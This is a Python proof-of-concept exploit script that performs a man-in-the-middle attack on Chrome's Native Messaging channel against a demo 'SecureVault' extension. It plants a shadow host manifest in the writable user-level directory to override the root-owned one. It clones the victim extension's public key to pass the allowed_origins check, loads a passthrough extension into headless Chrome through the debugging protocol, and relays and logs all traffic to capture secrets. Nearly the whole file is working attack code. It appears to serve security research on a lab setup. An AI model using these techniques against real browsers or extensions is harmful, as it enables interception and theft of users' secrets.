#!/usr/bin/env python3
"""
Attack 1: Bidirectional MITM
=============================
Intercepts the Native Messaging channel between the demo victim extension and
the real NM host via a 4-component relay chain:

  Demo victim Chrome extension
      ↕ NM stdio
  MITM wrapper  (this script, spawned by victim Chrome — parent IS Chrome)
      ↕ WebSocket :13501
  Relay         (this script in setup mode — logs all traffic)
      ↕ WebSocket :13500
  Passthrough extension  (in attacker headless Chrome)
      ↕ chrome.runtime.connectNative
  Real NM host  (spawned by attacker Chrome — parent IS Chrome)

Modes:
  --setup              (run by tester) : narrated walkthrough + relay server
  chrome-extension://… (spawned by Chrome) : MITM wrapper — bridges stdio↔relay

Run: python3 attack1_bidirectional_mitm.py --setup
"""

import sys, os, json, struct, subprocess, hashlib, base64
import asyncio, signal

# ── Paths ─────────────────────────────────────────────────────────────────────

SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
DEMO_DIR         = os.path.dirname(SCRIPT_DIR)
DEMO_EXT         = os.path.join(DEMO_DIR, "demo_extension", "manifest.json")
PASSTHROUGH_EXT  = os.path.join(SCRIPT_DIR, "passthrough_extension")
ATTACKER_PROFILE = os.path.join(SCRIPT_DIR, ".attacker_profile_a1")
INTERCEPT_LOG    = os.path.join(SCRIPT_DIR, "mitm_intercept.log")

HOST_NAME          = "com.demo.securevault"
REAL_MANIFEST_NAME = f"{HOST_NAME}_real"
SYSTEM_NM_DIR      = "/Library/Google/Chrome/NativeMessagingHosts"
USER_NM_DIR        = os.path.expanduser(
    "~/Library/Application Support/Google/Chrome/NativeMessagingHosts"
)
SHADOW_MANIFEST = os.path.join(USER_NM_DIR, f"{HOST_NAME}.json")

CDP_PORT      = 9224
WS_UPSTREAM   = 13500   # passthrough extension connects here (real-host side)
WS_DOWNSTREAM = 13501   # MITM wrapper connects here (victim-Chrome side)

# mutable ref so cleanup can reach chrome proc after asyncio.run() starts
_chrome_proc = [None]

# ── Printing helpers ───────────────────────────────────────────────────────────

def banner():
    print("\n" + "="*65)
    print("  ATTACK 1: BIDIRECTIONAL MITM")
    print("  Native Messaging channel interception via 4-component relay")
    print("="*65)

def control(n, msg):
    print(f"\n  Control {n}: {msg}")

def step(n, title):
    print(f"\n  Step {n}: {title}")
    print(f"  {'─'*55}")

def info(msg):
    print(f"            {msg}")

def bypass(msg):
    print(f"\n  >> {msg}")

def pause(msg="  Press Enter to continue..."):
    input(f"\n{msg}")


# ── NM I/O helpers ─────────────────────────────────────────────────────────────

def read_nm(pipe):
    raw = pipe.read(4)
    if len(raw) < 4:
        return None
    length = struct.unpack('<I', raw)[0]
    data = pipe.read(length)
    if len(data) < length:
        return None
    return json.loads(data.decode('utf-8'))

def write_nm(pipe, msg):
    encoded = json.dumps(msg).encode('utf-8')
    pipe.write(struct.pack('<I', len(encoded)))
    pipe.write(encoded)
    pipe.flush()


# ── Key extraction ─────────────────────────────────────────────────────────────

def extract_key_and_id():
    with open(DEMO_EXT) as f:
        m = json.load(f)
    key_b64 = m.get("key")
    if not key_b64:
        print("  ERROR: demo_extension/manifest.json has no 'key' field.")
        sys.exit(1)
    pub_der = base64.b64decode(key_b64)
    sha = hashlib.sha256(pub_der).hexdigest()[:32]
    ext_id = ''.join(chr(ord('a') + int(c, 16)) for c in sha)
    return key_b64, ext_id


# ── Manifest helpers ───────────────────────────────────────────────────────────

def read_system_manifest():
    path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    try:
        with open(path) as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"  ERROR: System manifest not found. Run install.sh first.")
        sys.exit(1)
    except PermissionError:
        print(f"  ERROR: Cannot read {path}. Run: sudo chmod 644 {path}")
        sys.exit(1)

def write_shadow_manifest(wrapper_path, ext_id):
    os.makedirs(USER_NM_DIR, exist_ok=True)
    manifest = {
        "name": HOST_NAME,
        "description": "MITM wrapper",
        "path": wrapper_path,
        "type": "stdio",
        "allowed_origins": [f"chrome-extension://{ext_id}/"]
    }
    with open(SHADOW_MANIFEST, 'w') as f:
        json.dump(manifest, f, indent=2)

def write_real_manifests(real_host_path, ext_id):
    """Write _real manifest to both user-level OS path and attacker profile dir.
    Chrome may read from either depending on --user-data-dir behaviour."""
    manifest = {
        "name": REAL_MANIFEST_NAME,
        "description": "Real demo victim host — for attacker Chrome",
        "path": real_host_path,
        "type": "stdio",
        "allowed_origins": [f"chrome-extension://{ext_id}/"]
    }
    paths = [
        os.path.join(USER_NM_DIR, f"{REAL_MANIFEST_NAME}.json"),
        os.path.join(ATTACKER_PROFILE, "NativeMessagingHosts",
                     f"{REAL_MANIFEST_NAME}.json"),
    ]
    for p in paths:
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, 'w') as f:
            json.dump(manifest, f, indent=2)
    return paths

def restore_shadow():
    if os.path.exists(SHADOW_MANIFEST):
        os.remove(SHADOW_MANIFEST)
        print("  Cleaned up: shadow manifest removed.")

def remove_real_manifests():
    for p in [
        os.path.join(USER_NM_DIR, f"{REAL_MANIFEST_NAME}.json"),
        os.path.join(ATTACKER_PROFILE, "NativeMessagingHosts",
                     f"{REAL_MANIFEST_NAME}.json"),
    ]:
        if os.path.exists(p):
            os.remove(p)
    print("  Cleaned up: _real manifests removed.")


# ── Relay ─────────────────────────────────────────────────────────────────────

class Relay:
    """
    Two-sided WebSocket relay:
      upstream   (:13500) <- passthrough extension (real-host side)
      downstream (:13501) <- MITM wrapper          (victim-Chrome side)
    Queues buffer messages when one side is temporarily disconnected.
    """
    def __init__(self):
        self._q_to_dn = asyncio.Queue()   # real host -> victim
        self._q_to_up = asyncio.Queue()   # victim -> real host
        self._ws_up   = None
        self._ws_dn   = None
        self._evt_up  = asyncio.Event()
        self._evt_dn  = asyncio.Event()

    def _log(self, direction, msg):
        line = f"[{direction}] {json.dumps(msg)}"
        print(f"  {line}")
        with open(INTERCEPT_LOG, 'a') as f:
            f.write(line + '\n')
        if msg.get('secret') is not None:
            print("\n" + "*"*65)
            print(f"  [STOLEN]  Secret extracted from intercepted traffic:")
            print(f"            {msg['secret']}")
            print("*"*65 + "\n")

    async def handle_upstream(self, ws):
        """Passthrough extension connects here — carries real-host responses."""
        info("  Passthrough extension connected to relay.")
        self._ws_up = ws
        self._evt_up.set()
        try:
            async for raw in ws:
                try:
                    msg = json.loads(raw)
                except Exception:
                    continue
                self._log("HOST->EXT", msg)
                await self._q_to_dn.put(raw)
        except Exception:
            pass
        finally:
            self._ws_up = None
            self._evt_up.clear()

    async def handle_downstream(self, ws):
        """MITM wrapper connects here — carries demo victim extension messages."""
        info("  MITM wrapper connected to relay (victim triggered extension).")
        self._ws_dn = ws
        self._evt_dn.set()
        try:
            async for raw in ws:
                try:
                    msg = json.loads(raw)
                except Exception:
                    continue
                self._log("EXT->HOST", msg)
                await self._q_to_up.put(raw)
        except Exception:
            pass
        finally:
            self._ws_dn = None
            self._evt_dn.clear()

    async def forward_to_downstream(self):
        """Drain real-host queue -> MITM wrapper (wait if wrapper not connected yet)."""
        while True:
            raw = await self._q_to_dn.get()
            while True:
                ws = self._ws_dn
                if ws is not None:
                    try:
                        await ws.send(raw)
                        break
                    except Exception:
                        self._ws_dn = None
                        self._evt_dn.clear()
                await self._evt_dn.wait()

    async def forward_to_upstream(self):
        """Drain victim queue -> passthrough extension (wait if ext not connected yet)."""
        while True:
            raw = await self._q_to_up.get()
            while True:
                ws = self._ws_up
                if ws is not None:
                    try:
                        await ws.send(raw)
                        break
                    except Exception:
                        self._ws_up = None
                        self._evt_up.clear()
                await self._evt_up.wait()


# ── CDP: SW console monitor ────────────────────────────────────────────────────

async def monitor_sw_console(ext_id: str):
    """Attach to the passthrough extension's service worker via CDP and
    forward its console output."""
    import urllib.request
    import websockets

    target_url = None
    for _ in range(30):   # wait up to 15 s for SW to appear
        try:
            data = urllib.request.urlopen(
                f"http://127.0.0.1:{CDP_PORT}/json", timeout=1
            ).read()
            for t in json.loads(data):
                if t.get("type") == "service_worker" and ext_id in t.get("url", ""):
                    target_url = t.get("webSocketDebuggerUrl")
                    break
            if target_url:
                break
        except Exception:
            pass
        await asyncio.sleep(0.5)

    if not target_url:
        info(f"  Could not find service worker target for {ext_id}")
        return

    info("  [cdp] Attached to passthrough extension service worker console")
    try:
        async with websockets.connect(target_url) as sw:
            await sw.send(json.dumps({"id": 1, "method": "Runtime.enable"}))
            async for raw in sw:
                event = json.loads(raw)
                if event.get("method") == "Runtime.consoleAPICalled":
                    args = event.get("params", {}).get("args", [])
                    parts = [str(a.get("value", a.get("description", ""))) for a in args]
                    print(f"  [SW] {' '.join(parts)}")
    except Exception as e:
        info(f"  Service worker monitor disconnected: {e}")


# ── CDP: launch attacker Chrome + load passthrough extension ───────────────────

async def launch_attacker_chrome(ext_id):
    import websockets

    chrome_bin = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

    # Patch passthrough extension key to match the demo victim extension
    pt_manifest = os.path.join(PASSTHROUGH_EXT, "manifest.json")
    with open(pt_manifest) as f:
        pt = json.load(f)
    with open(DEMO_EXT) as f:
        pt["key"] = json.load(f)["key"]
    with open(pt_manifest, 'w') as f:
        json.dump(pt, f, indent=2)

    # Patch background.js TARGET to _real host name
    bg_path = os.path.join(PASSTHROUGH_EXT, "background.js")
    with open(bg_path) as f:
        bg = f.read()
    with open(bg_path, 'w') as f:
        f.write(bg.replace("'com.demo.securevault'", f"'{REAL_MANIFEST_NAME}'"))

    # Wipe the entire attacker profile so stale extensions from previous runs
    # don't load and consume the NM host connection before our relay is ready.
    import shutil
    if os.path.exists(ATTACKER_PROFILE):
        shutil.rmtree(ATTACKER_PROFILE)
    os.makedirs(ATTACKER_PROFILE, exist_ok=True)

    # Chrome with --user-data-dir reads NM manifests from the profile's
    # NativeMessagingHosts/ directory, not the OS-level user path.
    # Restore the _real manifest from the OS user path after wiping.
    nm_src = os.path.join(USER_NM_DIR, f"{REAL_MANIFEST_NAME}.json")
    nm_dst_dir = os.path.join(ATTACKER_PROFILE, "NativeMessagingHosts")
    os.makedirs(nm_dst_dir, exist_ok=True)
    if os.path.exists(nm_src):
        shutil.copy2(nm_src, os.path.join(nm_dst_dir, f"{REAL_MANIFEST_NAME}.json"))

    proc = subprocess.Popen([
        chrome_bin,
        f"--remote-debugging-port={CDP_PORT}",
        "--headless=new",
        "--disable-gpu",
        f"--user-data-dir={ATTACKER_PROFILE}",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-sync",
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    _chrome_proc[0] = proc

    # Poll until CDP is ready
    import urllib.request
    ws_url = None
    for _ in range(20):
        try:
            data = urllib.request.urlopen(
                f"http://127.0.0.1:{CDP_PORT}/json/version", timeout=1
            ).read()
            ws_url = json.loads(data).get("webSocketDebuggerUrl")
            if ws_url:
                break
        except Exception:
            pass
        await asyncio.sleep(0.5)

    if not ws_url:
        info("  ERROR: CDP not reachable after 10s.")
        return proc, None

    async with websockets.connect(ws_url) as cdp:
        await cdp.send(json.dumps({
            "id": 1,
            "method": "Extensions.loadUnpacked",
            "params": {"path": os.path.abspath(PASSTHROUGH_EXT)}
        }))
        resp = json.loads(await asyncio.wait_for(cdp.recv(), timeout=10))
        if "error" in resp:
            info(f"  WARNING: CDP loadUnpacked: {resp['error'].get('message', resp['error'])}")
            return proc, None
        loaded_id = resp.get("result", {}).get("id", "unknown")
        return proc, loaded_id


# ── SETUP MODE ─────────────────────────────────────────────────────────────────

def run_setup():
    banner()

    print("\n  Controls in place:")
    control(1, "The NM manifest is installed at the system level "
               "(/Library/Google/Chrome/NativeMessagingHosts/), "
               "root-owned, requires administrator privileges to modify.")
    control(2, "The manifest lists allowed_origins, Chrome only forwards "
               "connections from the specific victim extension ID to this host.")
    control(3, "The demo victim host verifies its parent process is Google Chrome "
               "before responding to any request.")

    pause()

    # ── Step 1: Locate the manifest ───────────────────────────────────────────
    step(1, "Locating the NM manifest")

    sys_manifest_path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    if os.path.exists(sys_manifest_path):
        info(f"System manifest: {sys_manifest_path} (root-owned)")
    else:
        info("System-level manifest not found. Run install.sh first.")
        sys.exit(1)

    bypass("Bypassing Control 1: the user-level NM directory is always writable, "
           "a same-named file there silently overrides the system-level entry.")

    pause()

    # ── Step 2: Read manifest, extract extension ID, patch passthrough extension ─
    step(2, "Deriving the extension ID and patching the passthrough extension")

    sys_manifest = read_system_manifest()
    real_host_path = sys_manifest["path"]
    info(f"Demo victim host: {real_host_path}")
    info(f"allowed_origins:  {sys_manifest['allowed_origins']}")
    info("")
    info("Extension IDs are derived from the public key (SHA-256 of DER bytes,")
    info("first 32 nibbles mapped a-p). Key sources: .crx package, Chrome Preferences /")
    info("Secure Preferences (extensions.settings.<id>.manifest.key), installed")
    info("extension directory, or unpacked manifest.json.")
    info("")

    key_b64, ext_id = extract_key_and_id()
    info(f"Public key (first 60 chars): {key_b64[:60]}...")
    info(f"Derived extension ID:        {ext_id}")
    info("")
    info("The passthrough extension must carry the same key to pass allowed_origins.")

    bypass("Bypassing Control 2: passthrough extension carries the victim's key, "
           "same ID, allowed_origins passes.")

    pause()

    # ── Step 3: Write _real manifests for attacker Chrome ────────────────────
    step(3, "Writing the _real NM manifest for attacker Chrome")
    info("The passthrough extension calls connectNative('com.demo.securevault_real')")
    info("to avoid the shadow manifest. We write that manifest to two writable paths:")
    info("")

    real_paths = write_real_manifests(real_host_path, ext_id)
    for p in real_paths:
        info(f"  {p}")

    bypass("Both NM paths are writable without elevated privileges.")

    pause()

    # ── Step 4: Plant the shadow manifest ────────────────────────────────────
    step(4, "Planting the shadow manifest")

    wrapper_sh = os.path.join(SCRIPT_DIR, ".mitm_wrapper.sh")
    python_bin = sys.executable
    with open(wrapper_sh, 'w') as f:
        f.write(f"#!/bin/bash\nexec \"{python_bin}\" "
                f"\"{os.path.abspath(__file__)}\" \"$@\"\n")
    os.chmod(wrapper_sh, 0o755)

    write_shadow_manifest(wrapper_sh, ext_id)
    info(f"Shadow manifest: {SHADOW_MANIFEST}")
    info(f"Points to:       {wrapper_sh}")
    info("")
    info("Chrome spawns the MITM wrapper (parent = victim Chrome) and the real host")
    info("(parent = attacker headless Chrome). Both parent checks pass, no spoofing.")

    bypass("Bypassing Control 3: both parents are genuine Chrome processes.")

    pause()

    # ── Steps 5-6: async — relay + Chrome ─────────────────────────────────────

    pt_manifest_path = os.path.join(PASSTHROUGH_EXT, "manifest.json")
    pt_bg_path       = os.path.join(PASSTHROUGH_EXT, "background.js")

    try:
        asyncio.run(_relay_main(ext_id))
    except KeyboardInterrupt:
        pass
    finally:
        _do_cleanup(pt_manifest_path, pt_bg_path)


def _do_cleanup(pt_manifest_path, pt_bg_path):
    print("\n\n  Cleaning up...")
    restore_shadow()
    remove_real_manifests()
    if _chrome_proc[0]:
        _chrome_proc[0].terminate()
        print("  Attacker headless Chrome terminated.")
    # Restore passthrough extension key to placeholder
    try:
        with open(pt_manifest_path) as f:
            m = json.load(f)
        m["key"] = "PLACEHOLDER"
        with open(pt_manifest_path, 'w') as f:
            json.dump(m, f, indent=2)
    except Exception:
        pass
    # Restore passthrough extension background.js TARGET
    try:
        with open(pt_bg_path) as f:
            bg = f.read()
        with open(pt_bg_path, 'w') as f:
            f.write(bg.replace(f"'{REAL_MANIFEST_NAME}'", "'com.demo.securevault'"))
    except Exception:
        pass
    print("  Done.")


async def _relay_main(ext_id):
    import websockets

    relay = Relay()

    # ── Step 5: Start relay + launch attacker Chrome ──────────────────────────
    step(5, "Starting relay and launching attacker headless Chrome")
    info(f"Relay upstream   (passthrough extension): ws://127.0.0.1:{WS_UPSTREAM}")
    info(f"Relay downstream (MITM wrapper)         : ws://127.0.0.1:{WS_DOWNSTREAM}")

    bypass("Control 3 satisfied: real host's parent is attacker headless Chrome.")
    bypass("Developer mode restriction bypassed via CDP Extensions.loadUnpacked.")

    srv_up = await websockets.serve(relay.handle_upstream, "127.0.0.1", WS_UPSTREAM)
    srv_dn = await websockets.serve(relay.handle_downstream, "127.0.0.1", WS_DOWNSTREAM)
    asyncio.create_task(relay.forward_to_downstream())
    asyncio.create_task(relay.forward_to_upstream())

    info("")
    info(f"  Launching headless Chrome on CDP port {CDP_PORT}...")

    proc, loaded_id = await launch_attacker_chrome(ext_id)
    if proc:
        info(f"  Chrome launched (PID {proc.pid})")
        if loaded_id:
            info(f"  Passthrough extension loaded — ID: {loaded_id}")
            asyncio.create_task(monitor_sw_console(loaded_id))
        info(f"  Waiting for passthrough extension to connect to relay...")

    # ── Step 6: Wait for victim ───────────────────────────────────────────────
    step(6, "MITM is active — waiting for the victim")
    info("")
    info("  1. Open Chrome (your normal browser profile).")
    info("  2. Click the SecureVault extension popup -> Get Secret.")
    info("")
    info("  Intercepted messages appear below. Press Ctrl+C to stop.")
    info("")

    if os.path.exists(INTERCEPT_LOG):
        os.remove(INTERCEPT_LOG)

    try:
        await asyncio.Future()
    finally:
        srv_up.close()
        srv_dn.close()


# ── WRAPPER MODE (spawned by victim Chrome as NM host) ────────────────────────

def run_wrapper():
    asyncio.run(_run_wrapper_async())


async def _run_wrapper_async():
    import websockets

    relay_url = f"ws://127.0.0.1:{WS_DOWNSTREAM}"

    # Retry connecting to relay — setup mode must be running
    for attempt in range(15):
        try:
            async with websockets.connect(relay_url) as ws:
                loop = asyncio.get_running_loop()

                async def stdin_to_ws():
                    while True:
                        msg = await loop.run_in_executor(
                            None, lambda: read_nm(sys.stdin.buffer)
                        )
                        if msg is None:
                            break
                        await ws.send(json.dumps(msg))

                async def ws_to_stdout():
                    async for raw in ws:
                        try:
                            msg = json.loads(raw)
                        except Exception:
                            continue
                        write_nm(sys.stdout.buffer, msg)

                tasks = [
                    asyncio.create_task(stdin_to_ws()),
                    asyncio.create_task(ws_to_stdout()),
                ]
                done, pending = await asyncio.wait(
                    tasks, return_when=asyncio.FIRST_COMPLETED
                )
                for t in pending:
                    t.cancel()
            return
        except Exception:
            if attempt < 14:
                await asyncio.sleep(0.3)
            else:
                sys.exit(1)


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        run_setup()
    elif len(sys.argv) > 1 and sys.argv[1].startswith("chrome-extension://"):
        run_wrapper()
    else:
        print("Usage:")
        print("  python3 attack1_bidirectional_mitm.py --setup")
        sys.exit(1)
